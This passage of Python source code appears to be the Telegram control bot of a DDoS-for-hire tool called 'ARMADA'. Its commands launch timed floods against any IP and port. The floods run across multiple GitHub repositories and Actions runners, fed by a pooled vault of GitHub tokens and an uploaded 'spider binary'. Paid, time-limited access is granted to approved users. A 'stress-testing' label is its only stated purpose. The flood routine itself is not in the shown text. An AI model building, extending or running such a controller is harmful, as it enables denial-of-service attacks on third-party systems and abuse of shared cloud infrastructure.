        "<b>⚔️ STRIKE COMMANDS</b>\n"
        "<code>/strike</code> or <code>/attack</code> – Launch multi‑repo strike\n"
        "<code>/payload</code> or <code>/status</code> – View live raid feed\n"
        "<code>/abort</code> or <code>/stop</code> – Emergency abort all raids\n\n"
        
        "<b>🔧 TOKEN MANAGEMENT</b>\n"
        "<code>/inject</code> or <code>/addtoken</code> – Inject GitHub token\n"
        "<code>/eject</code> or <code>/removetoken</code> – Remove token\n"
        "<code>/scan</code> or <code>/checktokens</code> – Health check\n"
        "<code>/purge</code> or <code>/cleartokens</code> – Wipe vault\n"
        "<code>/vault</code> or <code>/tokens</code> – List all tokens\n\n"
        
        "<b>📤 BINARY DEPLOY</b>\n"
        "<code>/deploy</code> or <code>/binary_upload</code> – Deploy spider binary\n\n"
        
        "<b>👥 USER MANAGEMENT</b>\n"
        "<code>/grant</code> or <code>/approve</code> – Grant access\n"
        "<code>/revoke</code> or <code>/remove</code> – Revoke access\n"
        "<code>/list</code> or <code>/users</code> – List approved users\n"
        "<code>/requests</code> or <code>/pending</code> – Pending requests\n"
        "<code>/announce</code> or <code>/broadcast</code> – Broadcast message\n"
        "<code>/shield</code> or <code>/maintenance</code> – Toggle maintenance\n\n"
        
        "<b>ℹ️ UTILITY</b>\n"
        "<code>/start</code> – Main dashboard\n"
        "<code>/myid</code> – Your digital fingerprint\n"
        "<code>/about</code> – Bot info & credits\n"
        "<code>/matrix</code> – Matrix rain (fun)\n"
        "<code>/help</code> – This menu",
        parse_mode='HTML'
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"<b>🆔 YOUR DIGITAL FINGERPRINT</b>\n\n"
        f"<code>{update.effective_user.id}</code>\n\n"
        f"<i>Keep this safe – it's your access key.</i>",
        parse_mode='HTML'
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"<b>{BANNER_ARMADA}</b>\n\n"
        "⚡ <b>Version:</b> 3.0 (PRO HACKER EDITION)\n"
        "👨‍💻 <b>Built with:</b> Python, Pyrogram, GitHub Actions\n"
        "🔥 <b>Architecture:</b> Multi‑repo, Multi‑runner, Token‑aware\n"
        f"📦 <b>Max repos:</b> {MAX_REPOS_PER_ATTACK}\n"
        f"⚙️ <b>Runners/repo:</b> {RUNNERS_PER_ATTACK} × {THREADS_PER_RUNNER} threads\n"
        "🎯 <b>Purpose:</b> Stress‑testing & network resilience\n"
        "💬 <b>Motto:</b> \"Speed. Precision. Dominance.\"\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Use /help to see all commands (new + old).</i>",
        parse_mode='HTML'
    )

async def matrix_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"<b>{BANNER_MATRIX}</b>\n\n"
        "<i>Welcome to the Matrix.</i>",
        parse_mode='HTML'
    )

# ============================================================
# ===== ADMIN USER COMMANDS (NEW + OLD ALIASES) =====
# ============================================================
async def grant_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("📖 Usage: <code>/grant &lt;user_id&gt; &lt;days&gt;</code> (or /approve)", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "expiry": expiry, "days": days}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"✅ User <code>{target_id}</code> granted for {days} days.", parse_mode='HTML')
        try:
            await context.bot.send_message(target_id, "✅ <b>Access Granted!</b>\nUse /start to launch your first strike.", parse_mode='HTML')
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def revoke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/revoke &lt;user_id&gt;</code> (or /remove)", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} revoked.", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ User not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def list_users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not approved_users:
            await update.message.reply_text("📭 No approved users.", parse_mode='HTML')
            return
        msg = "<b>👥 APPROVED USERS</b>\n\n"
        for uid, data in approved_users.items():
            msg += f"`{uid}` – {data.get('days', '?')}d\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def requests_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not pending_users:
            await update.message.reply_text("📭 No pending requests.", parse_mode='HTML')
            return
        msg = "<b>⏳ PENDING REQUESTS</b>\n\n"
        for u in pending_users:
            msg += f"`{u.get('user_id')}` – @{u.get('username')}\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def announce_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📖 Usage: <code>/announce &lt;message&gt;</code> (or /broadcast)", parse_mode='HTML')
            return
        msg = " ".join(context.args)
        sent = 0
        for uid in list(owners.keys()) + list(approved_users.keys()):
            try:
                await context.bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}", parse_mode='HTML')
                sent += 1
            except:
                pass
        await update.message.reply_text(f"✅ Sent to {sent} users.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def shield_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/shield &lt;on/off&gt;</code> (or /maintenance)", parse_mode='HTML')
            return
        mode = context.args[0].lower()
        save_json('maintenance.json', {"maintenance": mode == "on"})
        await update.message.reply_text(f"🔧 Maintenance {'ENABLED' if mode == 'on' else 'DISABLED'}.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== CALLBACKS =====
# ============================================================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        if data == "strike_help":
            await query.edit_message_text(
                "<b>⚡ LAUNCH STRIKE</b>\n\n"
                "<code>/strike &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
                "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code> (old alias)\n\n"
                "<b>Example:</b>\n"
                "<code>/strike 1.1.1.1 443 60</code>\n\n"
                f"⏱️ Time: 5–3600 seconds\n"
                f"🔌 Port: 1–65535\n"
                f"📦 Uses up to {MAX_REPOS_PER_ATTACK} repos\n"
                "<i>Get ready for the heat.</i>",
                parse_mode='HTML'
            )
        elif data == "payload":
            await payload_cmd(update, context)
        elif data == "abort":
            await abort_cmd(update, context)
        elif data == "admin_panel" and is_owner(user_id):
            keyboard = [
                [InlineKeyboardButton("🔑 Tokens", callback_data="admin_vault")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_list")],
                [InlineKeyboardButton("⏳ Pending", callback_data="admin_requests")],
                [InlineKeyboardButton("📤 Binary", callback_data="admin_deploy")],
                [InlineKeyboardButton("🧹 Scan Tokens", callback_data="admin_scan")],
            ]
            await query.edit_message_text("🔧 <b>Admin Console</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        elif data == "admin_vault":
            await vault_cmd(update, context)
        elif data == "admin_list":
            await list_users_cmd(update, context)
        elif data == "admin_requests":
            await requests_cmd(update, context)
        elif data == "admin_deploy":
            await query.edit_message_text("📤 Use <code>/deploy</code> or <code>/binary_upload</code>", parse_mode='HTML')
        elif data == "admin_scan":
            await scan_tokens_cmd(update, context)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================
# ===== ERROR =====
# ============================================================
async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ System glitch. Check logs.", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================
def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        # Conversation handler for binary upload (supports both /deploy and /binary_upload)
        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler("deploy", binary_upload_start),
                CommandHandler("binary_upload", binary_upload_start)  # Old alias
            ],
            states={WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, binary_upload_receive), CommandHandler("cancel", binary_upload_cancel)]},
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv_handler)

        # ===== CORE COMMANDS (NEW + OLD ALIASES) =====
        app.add_handler(CommandHandler("start", start_cmd))
        
        # Strike commands
        app.add_handler(CommandHandler("strike", strike_cmd))
        app.add_handler(CommandHandler("attack", strike_cmd))  # OLD ALIAS
        
        # Payload / Status
        app.add_handler(CommandHandler("payload", payload_cmd))
        app.add_handler(CommandHandler("status", payload_cmd))  # OLD ALIAS
        
        # Abort / Stop
        app.add_handler(CommandHandler("abort", abort_cmd))
        app.add_handler(CommandHandler("stop", abort_cmd))  # OLD ALIAS
        
        # Token management
        app.add_handler(CommandHandler("inject", inject_cmd))
        app.add_handler(CommandHandler("addtoken", inject_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("eject", eject_cmd))
        app.add_handler(CommandHandler("removetoken", eject_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("purge", purge_cmd))
        app.add_handler(CommandHandler("cleartokens", purge_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("scan", scan_tokens_cmd))
        app.add_handler(CommandHandler("checktokens", scan_tokens_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("vault", vault_cmd))
        app.add_handler(CommandHandler("tokens", vault_cmd))  # OLD ALIAS
        
        # User admin
        app.add_handler(CommandHandler("grant", grant_cmd))
        app.add_handler(CommandHandler("approve", grant_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("revoke", revoke_cmd))
        app.add_handler(CommandHandler("remove", revoke_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("list", list_users_cmd))
        app.add_handler(CommandHandler("users", list_users_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("requests", requests_cmd))
        app.add_handler(CommandHandler("pending", requests_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("announce", announce_cmd))
        app.add_handler(CommandHandler("broadcast", announce_cmd))  # OLD ALIAS
        app.add_handler(CommandHandler("shield", shield_cmd))
        app.add_handler(CommandHandler("maintenance", shield_cmd))  # OLD ALIAS
        
        # Utility
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))
        app.add_handler(CommandHandler("about", about_cmd))
        app.add_handler(CommandHandler("matrix", matrix_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("🚀 ARMADA is ONLINE – ULTRA GENZ PRO Edition!")
        logger.info(f"⚙️ {RUNNERS_PER_ATTACK} Runners × {THREADS_PER_RUNNER} Threads per Repo")
        logger.info(f"📦 Max {MAX_REPOS_PER_ATTACK} Repos per Attack")
        logger.info("🎲 Token Manager Active – Rate‑Limit Aware")
        logger.info("✅ All OLD commands supported as aliases (/attack, /status, /addtoken, etc.)")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
